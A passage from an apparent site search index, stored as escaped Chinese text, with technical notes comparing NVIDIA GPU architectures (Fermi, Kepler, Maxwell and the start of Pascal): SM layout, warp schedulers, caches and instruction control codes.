\u200b\u4f4d\u200b\u3002\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u4fdd\u5b58\u200b\u4e86\u200b 32768 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u3002</p> <p>Tesla \u200b\u67b6\u6784\u200b\u6709\u200b\u56fe\u5f62\u5904\u7406\u200b\u7684\u200b\u60ef\u6027\u200b\uff0c\u200b\u53ea\u200b\u8003\u8651\u200b\u4e86\u200b\u56fe\u5f62\u5904\u7406\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6ca1\u6709\u200b\u8bbe\u7f6e\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\uff0c\u200b\u8ba4\u4e3a\u200b\u7a0b\u5e8f\u200b\u53ea\u4f1a\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u7eb9\u7406\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u7eb9\u7406\u200b\u7684\u200b L1 \u200b\u548c\u200b L2 \u200b\u7f13\u5b58\u200b\u3002\u200b\u4f46\u662f\u200b\u7f3a\u5c11\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u5bf9\u4e8e\u200b\u57fa\u4e8e\u200b CUDA \u200b\u7684\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\u7a0b\u5e8f\u200b\u662f\u200b\u81f4\u547d\u200b\u7684\u200b\u3002Fermi \u200b\u67b6\u6784\u200b\u5f15\u5165\u200b\u4e86\u200b L1 \u200b\u548c\u200b L2 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3002Fermi \u200b\u67b6\u6784\u200b\u7684\u200b Shared Memory \u200b\u548c\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u5927\u5c0f\u200b\u662f\u200b\u53ef\u200b\u914d\u7f6e\u200b\u7684\u200b\uff0c\u200b\u4e8c\u8005\u200b\u5171\u4eab\u200b 64 KB \u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b 48KB Shared Memory \u200b\u52a0\u200b 16KB \u200b\u7684\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b 16KB Shared Memory \u200b\u548c\u200b 48KB \u200b\u7684\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3002Fermi \u200b\u67b6\u6784\u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u5199\u200b\u56de\u200b\uff08write-back\uff09\u200b\u7b56\u7565\u200b\u3002</p> <p> </p> Fermi \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aFermi GF100 GPU Architecture Figure 3\uff09 <p> </p> Fermi \u200b\u67b6\u6784\u200b SM \u200b\u53d1\u5c04\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA\u2019s Fermi: The First Complete GPU Computing Architecture Figure 7\uff09 <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cSM \u200b\u5185\u90e8\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u4e24\u4e2a\u200b Warp Scheduler\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4ece\u200b\u4e24\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b warp \u200b\u53bb\u200b\u53d1\u5c04\u200b\u6307\u4ee4\u200b\u3002\u200b\u6bcf\u4e2a\u200b warp \u200b\u53ea\u4f1a\u200b\u53bb\u200b\u7528\u200b 16 \u200b\u4e2a\u200b CUDA core \u200b\u6216\u8005\u200b 16 \u200b\u4e2a\u200b LD/ST \u200b\u5355\u5143\u200b\u6216\u8005\u200b 4 \u200b\u4e2a\u200b SFU \u200b\u5355\u5143\u200b\u53bb\u200b\u6267\u884c\u200b\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 4 \u200b\u4e2a\u200b dispatch port\uff0c\u200b\u6bcf\u4e2a\u200b dispatch port \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u63a5\u53d7\u200b\u6700\u200b\u591a\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u3002\u200b\u56fe\u4e2d\u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4e00\u6761\u200b\u6d6e\u70b9\u200b\u6216\u8005\u200b\u6574\u6570\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4f1a\u200b\u8fdb\u5165\u200b\u67d0\u200b\u4e00\u7ec4\u200b CUDA core \u200b\u6267\u884c\u200b\uff0c\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5bf9\u5e94\u200b 16 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b dispatch port \u200b\u9700\u8981\u200b\u5360\u7528\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b SIN \u200b\u6216\u8005\u200b RCP \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u516b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5bf9\u5e94\u200b 4 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u3002</p> <p>GigaThread engine \u200b\u8d1f\u8d23\u200b\u628a\u200b thread block \u200b\u5206\u200b\u53d1\u7ed9\u200b SM\uff0c\u200b\u540c\u65f6\u200b\u53ef\u4ee5\u200b\u63d0\u9ad8\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u4f7f\u5f97\u200b GPGPU \u200b\u53ef\u4ee5\u200b\u9ad8\u6548\u200b\u5730\u200b\u5904\u7406\u200b\u6765\u81ea\u200b\u4e0d\u540c\u200b\u5e94\u7528\u200b\u7684\u200b kernel\uff0c\u200b\u6839\u636e\u200b Fermi whitepaper\uff1a</p> <ul> <li>10x faster application context switching: below 25 microseconds</li> <li>Concurrent kernel execution: different kernels of the same application context can execute on the GPU at the same time</li> <li>Out of Order thread block execution</li> <li>Dual overlapped memory transfer engines</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b Tesla 1.0\u3001Tesla 2.0 \u200b\u548c\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b GPU \u200b\u7684\u200b\u5bf9\u6bd4\u200b\u8868\u683c\u200b\uff1a</p> <p> </p> Tesla \u200b\u548c\u200b Fermi \u200b\u67b6\u6784\u200b\u5bf9\u6bd4\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aFermi Whitepaper Summary Table\uff09"},{"location":"hardware/gpgpu.html#nvidia-kepler","title":"NVIDIA Kepler","text":"<p>Whitepaper: NVIDIA\u2019s Next Generation CUDA Compute Architecture: Kepler TM GK110/210</p> <p>Datasheet: NVIDIA\u00ae KEPLER GK110 NEXT-GENERATION CUDA\u00ae COMPUTE ARCHITECTURE</p> <p>Kepler \u200b\u76f8\u6bd4\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b\u4e3b\u8981\u200b\u6539\u8fdb\u200b\uff1a</p> <ol> <li>Dynamic Parallelism \u200b\u548c\u200b Grid Management Unit\uff1a\u200b\u4e0d\u4ec5\u200b CPU \u200b\u53ef\u4ee5\u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\u5230\u200b GPU \u200b\u6267\u884c\u200b\uff0cGPU \u200b\u81ea\u5df1\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\u5230\u200b\u81ea\u5df1\u200b\u4e0a\u53bb\u200b\u6267\u884c\u200b</li> <li>Hyper-Q\uff1a\u200b\u5141\u8bb8\u200b\u591a\u4e2a\u200b CPU \u200b\u6838\u5fc3\u200b\u540c\u65f6\u200b\u5411\u200b GPU \u200b\u63d0\u4ea4\u200b\u4efb\u52a1\u200b\uff0c\u200b\u628a\u200b\u786c\u4ef6\u200b\u4efb\u52a1\u200b\u961f\u5217\u200b\u4ece\u200b 1 \u200b\u589e\u52a0\u200b\u5230\u200b\u4e86\u200b 32 \u200b\u4e2a\u200b\u3002\u200b\u6bcf\u4e2a\u200b CUDA stream \u200b\u4f1a\u200b\u5bf9\u5e94\u200b\u5230\u200b\u4e00\u4e2a\u200b\u786c\u4ef6\u200b\u4efb\u52a1\u200b\u961f\u5217\u200b\uff0c\u200b\u56e0\u6b64\u200b\u589e\u52a0\u200b\u786c\u4ef6\u200b\u4efb\u52a1\u200b\u961f\u5217\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b false dependency\u3002</li> <li>GPUDirect\uff1a\u200b\u652f\u6301\u200b RDMA</li> </ol> <p>\u200b\u548c\u200b\u524d\u200b\u4e24\u4ee3\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0cKepler \u200b\u53bb\u6389\u200b\u4e86\u200b TPC/GPC \u200b\u8fd9\u200b\u4e00\u4e2a\u200b\u5c42\u7ea7\u200b\uff0c\u200b\u800c\u662f\u200b\u628a\u200b SM \u200b\u505a\u200b\u7684\u200b\u5f88\u5927\u200b\uff0c\u200b\u79f0\u4e3a\u200b SMX\uff0c\u200b\u4e00\u4e2a\u200b GK110/GK210 \u200b\u6709\u200b 15 \u200b\u4e2a\u200b SMX\uff0c\u200b\u6bcf\u4e2a\u200b SMX \u200b\u91cc\u9762\u200b\u6709\u200b\uff1a</p> <ul> <li>\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b 192 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA Core\uff0c64 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\uff0c32 \u200b\u4e2a\u200b SFU\uff0c32 \u200b\u4e2a\u200b LD/ST \u200b\u5355\u5143\u200b</li> <li>\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b\u56db\u4e2a\u200b Warp Scheduler\uff0c\u200b\u6bcf\u4e2a\u200b Warp Scheduler \u200b\u9009\u51fa\u200b\u540c\u4e00\u4e2a\u200b Warp \u200b\u7684\u200b\u4e24\u6761\u200b\u6307\u4ee4\u200b\u53bb\u200b\u53d1\u5c04\u200b</li> <li>\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b 65536 \u200b\u6216\u8005\u200b 131072 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p> </p> Kepler \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA\u2019s Next Generation CUDA Compute Architecture: Kepler TM GK110/210\uff09 <p>\u200b\u4e0d\u8fc7\u200b\u6839\u636e\u200b Inside Kepler, Nvidia\u2019s Strong Start on 28 nm\uff0cKepler \u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u90e8\u200b\u5206\u4e3a\u200b\u56db\u4e2a\u200b Partition\uff08SMSP\uff0cStreaming Multiprocessor Sub Partition\uff09\uff0c\u200b\u6bcf\u4e2a\u200b Partition \u200b\u5305\u62ec\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c32 \u200b\u4e2a\u200b FP32 core\uff0c8 \u200b\u4e2a\u200b SFU\u3002\u200b\u56db\u4e2a\u200b Partition \u200b\u4ee5\u5916\u200b\u8fd8\u6709\u200b 64 \u200b\u4e2a\u200b shared FP32 core\u3002\u200b\u6216\u8bb8\u200b SMSP \u200b\u7684\u200b\u6982\u5ff5\u200b\u4ece\u200b Kepler \u200b\u8fd9\u200b\u4e00\u4ee3\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\uff08<code>For all GPUs since Kepler (with exception to GP100) there are 4 SMSP per SM.</code>\uff0c\u200b\u89c1\u200b https://forums.developer.nvidia.com/t/question-about-smsp-and-sm/154560/2\uff09\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5728\u200b\u7ed8\u5236\u200b\u5b83\u200b\u7684\u200b SM \u200b\u56fe\u793a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5206\u5f00\u200b\u753b\u200b\u3002\u200b\u6216\u8bb8\u200b\u662f\u200b\u89c9\u5f97\u200b\u5171\u4eab\u200b\u7684\u200b FP32 \u200b\u4e0d\u200b\u5bb9\u6613\u200b\u753b\u200b\u5427\u200b\u3002\u200b\u4ece\u200b Kepler \u200b\u7684\u200b\u4e0b\u4e00\u4ee3\u200b Maxwell \u200b\u5f00\u59cb\u200b\uff0c\u200b\u5c31\u200b\u6ca1\u6709\u200b\u5171\u4eab\u200b\u7684\u200b FP32 \u200b\u5355\u5143\u200b\u4e86\u200b\uff0c\u200b\u6240\u6709\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u90fd\u200b\u662f\u200b\u5f52\u200b\u5230\u200b\u67d0\u4e2a\u200b partition \u200b\u4e0b\u200b\u3002\uff08<code>As with SMX, each SMM has four warp schedulers. Unlike SMX, however, all SMM core functional units are assigned to a particular scheduler, with no shared units. Along with the selection of a power-of-two number of CUDA Cores per SM, which simplifies scheduling and reduces stall cycles, this partitioning of SM computational resources in SMM is a major component of the streamlined efficiency of SMM.</code>\uff0c\u200b\u6765\u6e90\u200b Tuning CUDA Applications for Maxwell\uff09\u3002</p> <p>Kepler \u200b\u4e3a\u4e86\u200b\u8981\u200b\u652f\u6301\u200b\u56db\u4e2a\u200b Warp Scheduler\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b Dispatch 8 \u200b\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u7b80\u5316\u200b\u4e86\u200b Warp Scheduler \u200b\u7684\u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\uff1a\u200b\u7531\u4e8e\u200b\u8ba1\u7b97\u200b\u6307\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7531\u200b\u7f16\u8bd1\u5668\u200b\u6765\u200b\u8ba1\u7b97\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u7684\u200b\u8c03\u5ea6\u200b\uff0c\u200b\u4ece\u800c\u200b\u51cf\u8f7b\u200b\u4e86\u200b\u786c\u4ef6\u200b\u8c03\u5ea6\u200b\u7684\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u786c\u4ef6\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u6307\u4ee4\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b\u597d\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u8c03\u5ea6\u200b Warp \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6839\u636e\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u9632\u6b62\u200b\u4e00\u4e9b\u200b Warp \u200b\u88ab\u200b\u8c03\u5ea6\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u5e94\u8be5\u200b\u662f\u200b\u4fdd\u5b58\u200b\u5728\u200b Control Code/Instruction \u200b\u4e2d\u200b\u7684\u200b\uff0c\u200b\u7f51\u4e0a\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u9488\u5bf9\u200b Control Code/Instruction \u200b\u7f16\u7801\u200b\u7684\u200b\u7814\u7a76\u200b\uff1a</p> <ul> <li>https://github.com/cloudcores/CuAssembler/blob/master/UserGuide.md</li> <li>https://github.com/NervanaSystems/maxas/wiki/Control-Codes</li> <li>https://zhuanlan.zhihu.com/p/166180054</li> </ul> <p>Control Code \u200b\u4e3b\u8981\u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <ul> <li>Stall Count: \u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u540e\u200b\uff0c\u200b\u9884\u8ba1\u200b\u7b49\u5f85\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5468\u671f\u200b\u518d\u200b\u53d1\u5c04\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b</li> <li>Yield Hint\uff1a\u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u540e\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5207\u6362\u200b\u5230\u200b\u5176\u4ed6\u200b Warp</li> <li>Read Dependency Barrier\uff1a\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b Dependency Barrier\uff0c\u200b\u8868\u793a\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u5ef6\u8fdf\u200b\u8bfb\u200b\u67d0\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5982\u679c\u200b\u540e\u7eed\u200b\u6709\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u4fee\u6539\u200b\u540c\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u540e\u7eed\u200b\u7684\u200b\u6307\u4ee4\u200b\u8981\u200b\u7b49\u5f85\u200b\u8fd9\u4e2a\u200b Dependency Barrier\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u4fee\u6539\u200b\u4e86\u200b\u524d\u9762\u200b\u6307\u4ee4\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b</li> <li>Write Dependency Barrier\uff1a\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b Dependency Barrier\uff0c\u200b\u8868\u793a\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u5199\u5165\u200b\u67d0\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4f46\u662f\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e0d\u200b\u786e\u5b9a\u200b\uff0c\u200b\u7528\u200b stall count \u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u6570\u636e\u200b\u5728\u200b\u540e\u7eed\u200b\u4f9d\u8d56\u200b\u5b83\u200b\u7684\u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u524d\u200b\u51c6\u5907\u200b\u597d\u200b\uff0c\u200b\u5c31\u8ba9\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u7b49\u5f85\u200b\u8fd9\u4e2a\u200b Dependency Barrier</li> <li>Wait Dependency Barrier\uff1a\u200b\u7b49\u5f85\u200b\u82e5\u5e72\u4e2a\u200b Dependency Barrier\uff0c\u200b\u5f53\u200b\u8bbe\u7f6e\u200b\u8be5\u200b Barrier \u200b\u4e0a\u200b\u7684\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u624d\u200b\u53ef\u4ee5\u200b\u8c03\u5ea6\u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b</li> </ul> <p>\u200b\u5185\u5b58\u200b\u5c42\u7ea7\u200b\u65b9\u9762\u200b\uff0cKepler \u200b\u5f15\u5165\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b 48KB \u200b\u53ea\u8bfb\u200b Data Cache\uff0c\u200b\u7528\u4e8e\u200b\u4fdd\u5b58\u200b\u53ea\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u76f8\u6bd4\u200b Shared/L1 cache \u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cKepler \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 256 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(128 / 32 = 4\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>GK110 \u200b\u6709\u200b 1536 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-maxwell","title":"NVIDIA Maxwell","text":"<p>Whitepaper: NVIDIA GeForce GTX 980</p> <p>PPT: New GPU Features of NVIDIA\u2019s Maxwell Architecture</p> <p>Blog: 5 Things You Should Know About the New Maxwell GPU Architecture</p> <p>\u200b\u867d\u7136\u200b Kepler \u200b\u628a\u200b GPC \u200b\u5c42\u6b21\u200b\u53bb\u6389\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b Maxwell \u200b\u67b6\u6784\u200b\u53c8\u200b\u628a\u200b GPC \u200b\u52a0\u56de\u6765\u200b\u4e86\u200b\u3002Maxwell \u200b\u5206\u4e3a\u200b\u4e24\u4ee3\u200b\uff0c\u200b\u7b2c\u4e00\u4ee3\u200b\u7684\u200b GM107 \u200b\u4ee5\u53ca\u200b\u7b2c\u4e8c\u4ee3\u200b\u7684\u200b GM204\u3002GM204 \u200b\u662f\u200b\u4e00\u4e2a\u200b Maxwell \u200b\u67b6\u6784\u200b\u7684\u200b GPU \u200b\u82af\u7247\u200b\uff1a</p> <ul> <li>4 GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b\u4e00\u4e2a\u200b raster engine \u200b\u548c\u200b\u56db\u4e2a\u200b SMM</li> <li>16 SMM\uff0c\u200b\u6bcf\u4e2a\u200b SMM \u200b\u6709\u200b 128 \u200b\u4e2a\u200b CUDA core\uff0c\u200b\u4e00\u4e2a\u200b PolyMorph engine \u200b\u548c\u200b 8 \u200b\u4e2a\u200b texture unit</li> <li>4 Memory Controller\uff0c\u200b\u4e00\u5171\u200b 256 \u200b\u4f4d\u200b\u5bbd\u200b\uff0c7Gbps GDDR5 \u200b\u5185\u5b58\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Memory Controller \u200b\u5e26\u6709\u200b 16 ROP \u200b\u5355\u5143\u200b\u548c\u200b 512KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b</li> <li>28nm \u200b\u5236\u7a0b\u200b</li> </ul> <p>Maxwell \u200b\u7684\u200b SM \u200b\u53eb\u505a\u200b SMM\uff0c\u200b\u5b83\u200b\u4f9d\u7136\u200b\u662f\u200b\u56db\u4e2a\u200b Warp Scheduler\uff0c\u200b\u4f46\u662f\u200b\u548c\u200b Kepler \u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u628a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u4e5f\u200b\u5212\u5206\u200b\u6210\u200b\u4e86\u200b\u56db\u4efd\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u4efd\u200b\u53eb\u505a\u200b\u4e00\u4e2a\u200b Processing Block\uff08PB\uff09\u3002\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u91cc\u9762\u200b\u6709\u200b\u4e00\u4e2a\u200b Instruction Buffer\uff0c\u200b\u4e00\u4e2a\u200b\u6bcf\u200b\u5468\u671f\u200b Dispatch \u200b\u4e24\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b Warp Scheduler\uff0c32 \u200b\u4e2a\u200b CUDA core\uff0c1 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\uff0c8 \u200b\u4e2a\u200b LD/ST unit \u200b\u4ee5\u53ca\u200b 8 \u200b\u4e2a\u200b SFU\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 128 \u200b\u4e2a\u200b CUDA core\uff0c\u200b\u6570\u91cf\u200b\u6bd4\u200b Kepler \u200b\u7684\u200b 192 CUDA core/SM \u200b\u53d8\u5c11\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b Maxwell \u200b\u4e5f\u200b\u914d\u7f6e\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u7684\u200b SM\u3002\u200b\u8fd9\u4e9b\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u53ea\u4f1a\u200b\u88ab\u200b Processing Block \u200b\u5185\u200b\u7684\u200b Warp scheduler \u200b\u4f7f\u7528\u200b\u3002</p> <p> </p> Maxwell \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA GeForce GTX 980 Whitepaper\uff09 <p>Maxwell \u200b\u67b6\u6784\u200b\u7684\u200b L1 \u200b\u7f13\u5b58\u200b\u548c\u200b Shared Memory \u200b\u4e0d\u518d\u200b\u5171\u4eab\u200b\uff0cShared Memory \u200b\u72ec\u5360\u200b 96KB\uff0c\u200b\u7136\u540e\u200b L1 \u200b\u7f13\u5b58\u200b\u548c\u200b Texture \u200b\u7f13\u5b58\u200b\u5171\u4eab\u200b\u7a7a\u95f4\u200b\u3002\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cMaxwell \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 256 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(128 / 4 / 8 = 4\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>GM200 \u200b\u6709\u200b 3072 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-pascal","title":"NVIDIA Pascal","text":"<p>Whitepaper: NVIDIA Tesla P100</p> <p>GP100 \u200b\u662f\u200b Pascal \u200b\u67b6\u6784\u200b\u7684\u200b\u82af\u7247\u200b\uff0c\u200b\u6539\u8fdb\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>\u200b\u652f\u6301\u200b NVLink\uff0c\u200b\u53cc\u5411\u200b\u5e26\u5bbd\u200b 160 GB/s</li> <li>\u200b\u4f7f\u7528\u200b HBM2 \u200b\u4f5c\u4e3a\u200b\u663e\u5b58\u200b\uff0c\u200b\u66ff\u4ee3\u200b\u4e86\u200b GDDR \u200b\u5185\u5b58\u200b</li> <li>TSMC 16nm FinFET \u200b\u5de5\u827a\u200b</li> <li>\u200b\u652f\u6301\u200b Unified Memory\uff0c\u200b\u4f7f\u5f97\u200b CPU \u200b\u548c\u200b GPU \u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u8ba9\u200b\u6570\u636e\u200b\u81ea\u52a8\u200b\u8fdb\u884c\u200b\u8fc1\u79fb\u200b</li> <li>\u200b\u652f\u6301\u200b Compute Preemption\uff0c\u200b\u4f7f\u5f97\u200b kernel \u200b\u53ef\u4ee5\u200b\u5728\u200b\u6307\u4ee4\u200b\u7ea7\u522b\u200b\u505a\u200b\u62a2\u5360\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b thread block \u200b\u7ea7\u522b\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u8c03\u8bd5\u5668\u200b\u7b49\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u4efb\u52a1\u200b\u4e0d\u4f1a\u200b\u963b\u788d\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u200b\u4efb\u52a1\u200b\u7684\u200b\u8fdb\u884c\u200b\uff1b\u200b\u5728\u200b Kepler \u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0c\u200b\u53ea\u6709\u200b\u7b49\u200b\u4e00\u4e2a\u200b thread block 